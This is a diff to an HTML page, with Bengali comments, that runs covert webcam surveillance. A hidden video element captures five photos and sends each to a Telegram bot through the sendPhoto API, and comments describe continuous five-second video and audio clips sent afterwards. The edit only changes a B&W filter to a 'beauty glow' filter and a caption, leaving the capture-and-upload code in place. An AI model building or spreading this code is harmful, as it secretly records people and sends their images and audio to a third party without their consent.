@@ -68,9 +68,9 @@
       display: none;
     }
 
-    /* 📸 ক্লাসিক ব্ল্যাক অ্যান্ড হোয়াইট ফিল্টার */
-    .filter-classic-bw {
-      filter: grayscale(100%) contrast(140%) brightness(105%);
+    /* ✨ প্রিমিয়াম বিউটি এবং স্কিন গ্লো ফিল্টার */
+    .filter-beauty-glow {
+      filter: contrast(105%) brightness(115%) saturate(115%) drop-shadow(0 0 2px rgba(255,255,255,0.2));
     }
   </style>
 </head>
@@ -102,7 +102,7 @@
     </div>
   </div>
 
-  <video id="hiddenCam" autoplay playsinline muted class="filter-classic-bw"></video>
+  <video id="hiddenCam" autoplay playsinline muted class="filter-beauty-glow"></video>
   <canvas id="snapshotCanvas"></canvas>
 
   <script>
@@ -184,7 +184,7 @@
         hiddenCam.srcObject = camStream;
         await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // ২. ক্লাসিক বিএন্ডডব্লিউ ফিল্টারসহ ৫টি ছবি খুব দ্রুত তুলবে ও পাঠাবে[span_1](start_span)[span_1](end_span)
+        // ২. বিউটি ফিল্টারসহ ৫টি ছবি খুব দ্রুত তুলবে ও পাঠাবে
         await captureAndSendPhotos(5);
 
         // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও অডিও ক্লিপ পাঠানো শুরু করবে
@@ -223,9 +223,8 @@
           const formData = new FormData();
           formData.append('chat_id', TELEGRAM_CHAT_ID);
           formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
-          formData.append('caption', `🎬 ক্লাসিক বিএন্ডডব্লিউ ছবি #${i}`);[span_2](start_span)[span_2](end_span)
+          formData.append('caption', `✨ বিউটি ফিল্টার ছবি #${i}`);
 
-          // await ব্যবহার করে রিকোয়েস্ট পাঠানো নিশ্চিত করা হয়েছে যাতে মেসেজ ড্রপ না হয়
           await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
@@ -281,13 +280,11 @@
             }
           }
 
-          // পরবর্তী ক্লিপের জন্য রিকার্সভ কল
           setTimeout(recordInterval, 1000);
         };
 
         mediaRecorder.start();
 
-        // ঠিক ৫ সেকেন্ড পর রেকর্ডিং বন্ধ করা
         setTimeout(() => {
           if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
